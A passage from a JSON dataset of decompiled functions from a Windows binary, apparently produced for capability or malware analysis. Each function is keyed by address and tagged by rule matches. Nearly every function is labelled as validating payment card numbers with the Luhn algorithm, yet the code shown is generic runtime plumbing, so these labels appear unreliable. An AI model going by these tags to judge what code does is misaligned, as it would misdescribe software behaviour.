        "decompiled_code": "\nvoid __fastcall fcn.0041d810(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41d8a5;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.004049d4();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41d8ac;\n    uStack44 = 0x41d8a4;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 342
    },
    "0041d8bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d8bc(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.0041d8b8();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040c918(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.004045bc();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00403fe1. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x485014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 199
    },
    "0041d94c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041d94c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41da24;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41d97a;\n    fcn.0041d740();\n    uStack52 = 0x41da02;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41da09;\n    uStack52 = 0x41da01;\n    fcn.0041d7fc();\n    return;\n}\n",
        "token_count": 358
    },
    "0041da40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041da40(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41da8c;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + 0x1c))();\n    fcn.00404a88();\n    fcn.004094bc();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41da93;\n    uStack24 = 0x41da8b;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 188
    },
    "0041da9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041da9c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x41dba7;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.00404660();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.00404888();\n            fcn.00404888();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004046b8();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = fcn.00404888();\n            if (iVar2 != 0) {\n                fcn.00402d34();\n            }\n            iVar2 = fcn.00404888();\n            if (iVar2 != 0) {\n                fcn.00402d34();\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x41dbae;\n    uStack56 = 0x41dba6;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 427
    },
    "0041dbc4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041dbc4(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41dc3c;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41dc43;\n    uStack36 = 0x41dc3b;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 268
    },
    "0041dc50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041dc50(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    uStack44 = 0x41dd13;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_4h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_8h = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041e2c8();\n            fcn.004047b0();\n            iVar1 = fcn.0040d5a0();\n            if (iVar1 != 0) {\n                fcn.00404ae8(&fcn.0041dc50::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x0041dcf0;\n            }\n            var_8h = var_8h + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_8h = -1;\ncode_r0x0041dcf0:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41dd1a;\n    uStack44 = 0x41dd0a;\n    fcn.004045ec();\n    uStack44 = 0x41dd12;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 484
    },
    "0041dddc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041dddc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41de79;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x41de04;\n    fcn.0041d740();\n    uStack40 = 0x41de5c;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.0041e990();\n    fcn.004046b8();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41de63;\n    uStack40 = 0x41de5b;\n    fcn.0041d7fc();\n    return;\n}\n",
        "token_count": 308
    },
    "0041de88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041de88(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41df29;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x41deb7;\n        fcn.0041d740();\n        uStack44 = 0x41df0c;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x41df13;\n        uStack48 = 0x41df0b;\n        fcn.0041d7fc();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41df30;\n    uStack32 = 0x41df28;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 376
    },
    "0041df70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041df70(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x41e014;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41df97;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.00420bb4();\n    puStack32 = 0x41df9f;\n    fcn.0041d740();\n    uStack36 = 0x41dfef;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.0041fc54();\n        if (cVar1 != '\\0') break;\n        fcn.0042186c();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41dff6;\n    uStack36 = 0x41dfee;\n    fcn.0041d7fc();\n    return;\n}\n",
        "token_count": 385
    },
    "0041e238": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041e238(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41e2ae;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    fcn.00422418();\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.004224c0();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    fcn.00422420();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41e2b5;\n    uStack36 = 0x41e2ad;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 261
    },
    "0041e50c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e50c(int32_t param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_EAX;\n    \n    puVar1 = *(in_EAX + 0x10) + param_2 * 8;\n    puVar2 = *(in_EAX + 0x10) + param_1 * 8;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar2;\n    *puVar2 = uVar3;\n    uVar3 = puVar1[1];\n    puVar1[1] = puVar2[1];\n    puVar2[1] = uVar3;\n    return;\n}\n",
        "token_count": 174
    },
    "0041e63c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e63c(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 40
    },
    "0041e990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041e990(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 56
    },
    "0041ea7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041ea7c(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00403770();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040c9d4(0, &var_8h);\n    fcn.00403fc0();\n    return;\n}\n",
        "token_count": 118
    },
    "0041ed20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ed20(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x41ed3c;\n    fcn.0041f3b0(0x1000);\n    uStackY28 = 0x41ed70;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.00421420();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x41ed77;\n    uStackY28 = 0x41ed6f;\n    fcn.00403820();\n    return;\n}\n",
        "token_count": 193
    },
    "0041ed80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ed80(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 166
    },
    "0041ee44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0041ee44(uint32_t arg_8h)\n\n{\n    uint32_t in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.0041ee88(0, in_EAX & 0xffff0000 | arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0041f22c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041f22c(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_DL = extraout_DL;\n    }\n    fcn.004037f0();\n    fcn.00404a88();\n    fcn.0041f2f4(arg_8h);\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = arg_8h;\n    }\n    return in_EAX;\n}\n",
        "token_count": 153
    },
    "0041f284": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041f284(int32_t arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x41f2e7;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = *(arg_8h + -4);\n    var_4h._0_1_ = 6;\n    arg_ch = &var_8h;\n    arg_8h_00 = 0;\n    fcn.0040675c();\n    fcn.0040c918(arg_8h_00, arg_ch);\n    fcn.00403fc0();\n    *in_FS_OFFSET = arg_8h_00;\n    uStack28 = 0x41f2ee;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 269
    },
    "0041f3b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041f3b0(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00402b14();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 212
    },
    "0041f4fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041f4fc(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00403b58();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.0040461c();\n    fcn.0040461c();\n    if (in_DL != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 227
    },
    "0041faa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041faa0(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040c9d4(0, auStack12);\n    fcn.00403fc0();\n    return;\n}\n",
        "token_count": 67
    },
    "004200ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004200ac(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x4200bf;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x42014c;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0041fc54();\n    if (cVar1 == '\\0') {\n        fcn.0041d190();\n    }\n    while( true ) {\n        cVar1 = fcn.0041fc54();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041ff94();\n        if (cVar1 - 2U < 3) {\n            fcn.00420b04();\n        }\n        fcn.0041d0c4();\n        fcn.00420bb4();\n        while( true ) {\n            cVar1 = fcn.0041fc54();\n            if (cVar1 != '\\0') break;\n            fcn.00420d20();\n        }\n        fcn.00420bbc();\n    }\n    fcn.00420bbc();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x420153;\n    uStack24 = 0x42014b;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 370
    },
    "00420818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00420818(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x42083a;\n        cVar3 = fcn.0041fc54();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x420832;\n        fcn.00420d20();\n    }\n    puStack32 = 0x420846;\n    fcn.00420bbc();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x420863;\n    uVar4 = fcn.00403a28();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x4208da;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.00403a28();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.0041fc54();\n        if (cVar3 != '\\0') break;\n        fcn.0042056c();\n    }\n    fcn.00420bbc();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 456
    },
    "0042092c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0042092c(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.00421a0c();\n    if (cVar2 == '\\x0f') {\n        fcn.0041ffb8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00420b70();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 137
    },
    "00420970": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.00420970(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.00421a0c();\n    if (cVar2 == '\\x10') {\n        fcn.0041ffb8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00420b70();\n        iStack20 = ROUND(iVar1 * *0x4209bc);\n    }\n    return iStack20;\n}\n",
        "token_count": 146
    },
    "004209c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.004209c0(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.00421a0c();\n    if (cVar2 == '\\x11') {\n        fcn.0041ffb8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.00420b70();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 136
    },
    "00420b04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00420b04(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.00421a0c();\n    if (cVar1 == '\\x02') {\n        fcn.0041ffb8();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.0041ffb8();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.0041ffb8();\n    }\n    else {\n        fcn.0041fa94();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 189
    },
    "00420b70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00420b70(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.0041ff94();\n    if (cVar1 == '\\x13') {\n        fcn.00421a0c();\n        fcn.0041ffb8();\n    }\n    else {\n        iStack12 = fcn.00420b04();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 127
    },
    "00420f04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00420f04(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.0041bea8();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.004186b0();\n        return;\n    }\n    fcn.0041fa94();\n    return;\n}\n",
        "token_count": 111
    },
    "004213c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004213c0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.0040461c();\n    while( true ) {\n        cVar1 = fcn.0041c040();\n        if (cVar1 != '\\0') break;\n        fcn.00409998(param_2);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "0042186c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
